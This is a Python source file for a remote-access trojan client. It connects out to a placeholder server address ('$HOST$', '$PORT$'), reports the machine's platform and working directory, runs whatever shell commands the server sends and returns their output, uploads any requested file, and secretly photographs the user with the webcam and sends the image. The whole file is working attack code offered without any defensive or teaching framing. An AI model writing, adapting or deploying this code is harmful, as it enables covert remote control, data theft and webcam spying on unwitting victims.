import socket
import subprocess
import os
import platform
import time
import cv2


def webcam_snap():
    webcam = cv2.VideoCapture(0)
    check, frame = webcam.read()
    if not os.path.exists("C:\\tmp"):
        os.mkdir("C:\\tmp")
    cv2.imwrite(filename="C:\\tmp\\p.png", img=frame)
    webcam.release()
    send_file("C:\\tmp\\p.png")
    os.remove("C:\\tmp\\p.png")


def send_file(filename):
    try:
        filesize = os.path.getsize(filename)
    except:
        s.send("Path doesn't exist!".encode())
        return
    s.send(str(filesize).encode())
    if s.recv(BUFFER_SIZE).decode() == "ok":
        # start sending the file
        with open(filename, "rb") as f:
            while True:
                # read the bytes from the file
                bytes_read = f.read(BUFFER_SIZE)
                if not bytes_read:
                    # file transmitting is done
                    break
                s.sendall(bytes_read)


def run():
    while True:
        # receive the command from the server
        command = s.recv(BUFFER_SIZE).decode()
        if command.lower() == "exit":
            # if the command is exit, just break out of the loop
            break
        elif command[:2] == 'cd':
            if command[3] == '~':
                os.chdir(os.environ['HOME'] + (command[4:] if len(command)>3 else None))
            else:
                os.chdir(command[3:])
            s.send(os.getcwd().encode())
        elif command[:8] == "download":
            filename = command[9:]
            send_file(filename)
        elif command[:11] == "webcam_snap":
            webcam_snap()
        else:
            # execute the command and retrieve the results
            p = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE)
            output, err = p.communicate()
            # send the results back to the server
            s.send(output + (err if err else "".encode()) + "\n".encode() + os.getcwd().encode())
    # close client connection
    s.close()


if __name__ == '__main__':
    SERVER_HOST = "$HOST$"
    SERVER_PORT = "$PORT$"
    BUFFER_SIZE = 10240
    SEPARATOR = "<SEPARATOR>"

    # create the socket object
    s = socket.socket()
    # connect to the server
    s.connect((SERVER_HOST, SERVER_PORT))
    # send platform message
    s.send(platform.platform().encode() + "\n".encode() + os.getcwd().encode())
    # acccept the chcp command
    cmd = s.recv(BUFFER_SIZE).decode()
    p = subprocess.Popen(cmd, shell=True, stdout=subprocess.PIPE)
    output, err = p.communicate()
    # Run the loop
    run()